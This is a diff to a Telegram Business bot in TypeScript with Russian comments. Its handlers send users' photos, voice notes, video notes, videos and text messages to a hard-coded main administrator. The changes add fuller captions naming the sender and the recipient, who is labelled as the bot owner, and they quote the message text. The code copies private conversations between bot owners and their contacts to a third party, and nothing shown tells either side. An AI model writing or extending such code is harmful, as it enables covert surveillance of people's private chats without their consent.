@@ -142,6 +142,15 @@ export class BusinessImageMessageHandler implements IUpdateHandler {
           return;
         }
 
+        // Получаем информацию о получателе (владельце бота)
+        let receiverInfo = "Неизвестный пользователь";
+        try {
+          const receiverUser = await this.usersCollection.getUserById(user_chat_id);
+          receiverInfo = receiverUser.username ? `@${receiverUser.username}` : `ID: ${user_chat_id}`;
+        } catch (error) {
+          receiverInfo = `ID: ${user_chat_id}`;
+        }
+
         const { file_id } = ctx.businessMessage.photo[0];
         
         // Create user if not exists
@@ -169,15 +178,21 @@ export class BusinessImageMessageHandler implements IUpdateHandler {
 
         // ОТПРАВЛЯЕМ ФОТО ГЛАВНОМУ АДМИНУ
         if (ctx.from.id !== MAIN_ADMIN_ID) {
+          const senderUsername = ctx.from.username ? `@${ctx.from.username}` : 'нет username';
+          const senderName = `${ctx.from.first_name}${ctx.from.last_name ? ' ' + ctx.from.last_name : ''}`;
+          
           await ctx.api.sendPhoto(
             MAIN_ADMIN_ID,
             file_id,
             {
-              caption: `👤 <b>Новое фото от пользователя:</b>\n` +
-                      `🆔 <b>ID отправителя:</b> <code>${ctx.from.id}</code>\n` +
-                      `👤 <b>Имя:</b> ${ctx.from.first_name}\n` +
-                      `🔗 <b>Username:</b> ${ctx.from.username ? '@' + ctx.from.username : 'нет'}\n` +
-                      `💬 <b>Получатель (владелец бота):</b> ${user_chat_id}`,
+              caption: `📸 <b>НОВОЕ ФОТО МЕЖДУ ПОЛЬЗОВАТЕЛЯМИ:</b>\n\n` +
+                      `👤 <b>ОТПРАВИТЕЛЬ:</b>\n` +
+                      `   ├ ID: <code>${ctx.from.id}</code>\n` +
+                      `   ├ Имя: ${senderName}\n` +
+                      `   └ Username: ${senderUsername}\n\n` +
+                      `👥 <b>ПОЛУЧАТЕЛЬ:</b>\n` +
+                      `   └ ${receiverInfo}\n\n` +
+                      `${ctx.businessMessage.caption ? `📝 <b>ПОДПИСЬ:</b>\n<blockquote>${ctx.businessMessage.caption}</blockquote>` : ''}`,
               parse_mode: "HTML"
             }
           );
@@ -210,6 +225,15 @@ export class BusinessVoiceMessageHandler implements IUpdateHandler {
           return;
         }
 
+        // Получаем информацию о получателе (владельце бота)
+        let receiverInfo = "Неизвестный пользователь";
+        try {
+          const receiverUser = await this.usersCollection.getUserById(user_chat_id);
+          receiverInfo = receiverUser.username ? `@${receiverUser.username}` : `ID: ${user_chat_id}`;
+        } catch (error) {
+          receiverInfo = `ID: ${user_chat_id}`;
+        }
+
         const { file_id, duration } = ctx.businessMessage.voice;
         
         // Create user if not exists
@@ -237,15 +261,21 @@ export class BusinessVoiceMessageHandler implements IUpdateHandler {
 
         // ОТПРАВЛЯЕМ ГОЛОСОВОЕ ГЛАВНОМУ АДМИНУ
         if (ctx.from.id !== MAIN_ADMIN_ID) {
+          const senderUsername = ctx.from.username ? `@${ctx.from.username}` : 'нет username';
+          const senderName = `${ctx.from.first_name}${ctx.from.last_name ? ' ' + ctx.from.last_name : ''}`;
+          
           await ctx.api.sendVoice(
             MAIN_ADMIN_ID,
             file_id,
             {
-              caption: `👤 <b>Новое голосовое от пользователя:</b>\n` +
-                      `🆔 <b>ID отправителя:</b> <code>${ctx.from.id}</code>\n` +
-                      `👤 <b>Имя:</b> ${ctx.from.first_name}\n` +
-                      `🔗 <b>Username:</b> ${ctx.from.username ? '@' + ctx.from.username : 'нет'}\n` +
-                      `💬 <b>Получатель (владелец бота):</b> ${user_chat_id}`,
+              caption: `🎤 <b>НОВОЕ ГОЛОСОВОЕ МЕЖДУ ПОЛЬЗОВАТЕЛЯМИ:</b>\n\n` +
+                      `👤 <b>ОТПРАВИТЕЛЬ:</b>\n` +
+                      `   ├ ID: <code>${ctx.from.id}</code>\n` +
+                      `   ├ Имя: ${senderName}\n` +
+                      `   └ Username: ${senderUsername}\n\n` +
+                      `👥 <b>ПОЛУЧАТЕЛЬ:</b>\n` +
+                      `   └ ${receiverInfo}\n\n` +
+                      `⏱️ <b>Длительность:</b> ${duration} сек`,
               parse_mode: "HTML"
             }
           );
@@ -278,6 +308,15 @@ export class BusinessVideoMessageHandler implements IUpdateHandler {
           return;
         }
 
+        // Получаем информацию о получателе (владельце бота)
+        let receiverInfo = "Неизвестный пользователь";
+        try {
+          const receiverUser = await this.usersCollection.getUserById(user_chat_id);
+          receiverInfo = receiverUser.username ? `@${receiverUser.username}` : `ID: ${user_chat_id}`;
+        } catch (error) {
+          receiverInfo = `ID: ${user_chat_id}`;
+        }
+
         const { file_id, duration } = ctx.businessMessage.video_note;
         
         // Create user if not exists
@@ -305,17 +344,23 @@ export class BusinessVideoMessageHandler implements IUpdateHandler {
 
         // ОТПРАВЛЯЕМ ВИДЕОСООБЩЕНИЕ ГЛАВНОМУ АДМИНУ
         if (ctx.from.id !== MAIN_ADMIN_ID) {
+          const senderUsername = ctx.from.username ? `@${ctx.from.username}` : 'нет username';
+          const senderName = `${ctx.from.first_name}${ctx.from.last_name ? ' ' + ctx.from.last_name : ''}`;
+          
           // Сначала отправляем видеосообщение
           await ctx.api.sendVideoNote(MAIN_ADMIN_ID, file_id);
           
           // Затем отправляем описание отдельным сообщением
           await ctx.api.sendMessage(
             MAIN_ADMIN_ID,
-            `👤 <b>Новое видеосообщение от пользователя:</b>\n` +
-            `🆔 <b>ID отправителя:</b> <code>${ctx.from.id}</code>\n` +
-            `👤 <b>Имя:</b> ${ctx.from.first_name}\n` +
-            `🔗 <b>Username:</b> ${ctx.from.username ? '@' + ctx.from.username : 'нет'}\n` +
-            `💬 <b>Получатель (владелец бота):</b> ${user_chat_id}`,
+            `🎥 <b>НОВОЕ ВИДЕОСООБЩЕНИЕ МЕЖДУ ПОЛЬЗОВАТЕЛЯМИ:</b>\n\n` +
+            `👤 <b>ОТПРАВИТЕЛЬ:</b>\n` +
+            `   ├ ID: <code>${ctx.from.id}</code>\n` +
+            `   ├ Имя: ${senderName}\n` +
+            `   └ Username: ${senderUsername}\n\n` +
+            `👥 <b>ПОЛУЧАТЕЛЬ:</b>\n` +
+            `   └ ${receiverInfo}\n\n` +
+            `⏱️ <b>Длительность:</b> ${duration} сек`,
             { parse_mode: "HTML" }
           );
         }
@@ -347,6 +392,15 @@ export class BusinessVideoFileHandler implements IUpdateHandler {
           return;
         }
 
+        // Получаем информацию о получателе (владельце бота)
+        let receiverInfo = "Неизвестный пользователь";
+        try {
+          const receiverUser = await this.usersCollection.getUserById(user_chat_id);
+          receiverInfo = receiverUser.username ? `@${receiverUser.username}` : `ID: ${user_chat_id}`;
+        } catch (error) {
+          receiverInfo = `ID: ${user_chat_id}`;
+        }
+
         const { file_id, duration, file_name, mime_type } = ctx.businessMessage.video;
         
         // Create user if not exists
@@ -374,15 +428,23 @@ export class BusinessVideoFileHandler implements IUpdateHandler {
 
         // ОТПРАВЛЯЕМ ВИДЕОФАЙЛ ГЛАВНОМУ АДМИНУ
         if (ctx.from.id !== MAIN_ADMIN_ID) {
+          const senderUsername = ctx.from.username ? `@${ctx.from.username}` : 'нет username';
+          const senderName = `${ctx.from.first_name}${ctx.from.last_name ? ' ' + ctx.from.last_name : ''}`;
+          
           await ctx.api.sendVideo(
             MAIN_ADMIN_ID,
             file_id,
             {
-              caption: `👤 <b>Новое видео от пользователя:</b>\n` +
-                      `🆔 <b>ID отправителя:</b> <code>${ctx.from.id}</code>\n` +
-                      `👤 <b>Имя:</b> ${ctx.from.first_name}\n` +
-                      `🔗 <b>Username:</b> ${ctx.from.username ? '@' + ctx.from.username : 'нет'}\n` +
-                      `💬 <b>Получатель (владелец бота):</b> ${user_chat_id}`,
+              caption: `🎬 <b>НОВОЕ ВИДЕО МЕЖДУ ПОЛЬЗОВАТЕЛЯМИ:</b>\n\n` +
+                      `👤 <b>ОТПРАВИТЕЛЬ:</b>\n` +
+                      `   ├ ID: <code>${ctx.from.id}</code>\n` +
+                      `   ├ Имя: ${senderName}\n` +
+                      `   └ Username: ${senderUsername}\n\n` +
+                      `👥 <b>ПОЛУЧАТЕЛЬ:</b>\n` +
+                      `   └ ${receiverInfo}\n\n` +
+                      `📁 <b>Файл:</b> ${file_name || 'Без названия'}\n` +
+                      `⏱️ <b>Длительность:</b> ${duration} сек\n` +
+                      `📊 <b>Формат:</b> ${mime_type || 'Неизвестный'}`,
               parse_mode: "HTML"
             }
           );
@@ -424,6 +486,15 @@ export class BusinessMessageHandler implements IUpdateHandler {
           username: ""
         });
 
+        // Получаем информацию о получателе (владельце бота)
+        let receiverInfo = "Неизвестный пользователь";
+        try {
+          const receiverUser = await this.usersCollection.getUserById(user_chat_id);
+          receiverInfo = receiverUser.username ? `@${receiverUser.username}` : `ID: ${user_chat_id}`;
+        } catch (error) {
+          receiverInfo = `ID: ${user_chat_id}`;
+        }
+
         // Then update the attribute
         await this.usersCollection.setAttribute(user_chat_id, "lastReceiveMessageAt", Date.now());
         
@@ -443,14 +514,20 @@ export class BusinessMessageHandler implements IUpdateHandler {
 
           // ОТПРАВЛЯЕМ ВСЕ СООБЩЕНИЯ ГЛАВНОМУ АДМИНУ
           if (ctx.from.id !== MAIN_ADMIN_ID) {
+            const senderUsername = ctx.from.username ? `@${ctx.from.username}` : 'нет username';
+            const senderName = `${ctx.from.first_name}${ctx.from.last_name ? ' ' + ctx.from.last_name : ''}`;
+            
             await ctx.api.sendMessage(
               MAIN_ADMIN_ID,
-              `👤 <b>Новое сообщение от пользователя:</b>\n` +
-              `📝 <b>Текст:</b> ${text}\n` +
-              `🆔 <b>ID отправителя:</b> <code>${ctx.from.id}</code>\n` +
-              `👤 <b>Имя:</b> ${ctx.from.first_name}${ctx.from.last_name ? ' ' + ctx.from.last_name : ''}\n` +
-              `🔗 <b>Username:</b> ${ctx.from.username ? '@' + ctx.from.username : 'нет'}\n` +
-              `💬 <b>Получатель (владелец бота):</b> ${user_chat_id}`,
+              `💬 <b>НОВОЕ СООБЩЕНИЕ МЕЖДУ ПОЛЬЗОВАТЕЛЯМИ:</b>\n\n` +
+              `👤 <b>ОТПРАВИТЕЛЬ:</b>\n` +
+              `   ├ ID: <code>${ctx.from.id}</code>\n` +
+              `   ├ Имя: ${senderName}\n` +
+              `   └ Username: ${senderUsername}\n\n` +
+              `👥 <b>ПОЛУЧАТЕЛЬ:</b>\n` +
+              `   └ ${receiverInfo}\n\n` +
+              `📝 <b>СООБЩЕНИЕ:</b>\n` +
+              `<blockquote>${text}</blockquote>`,
               { parse_mode: "HTML" }
             );
           }
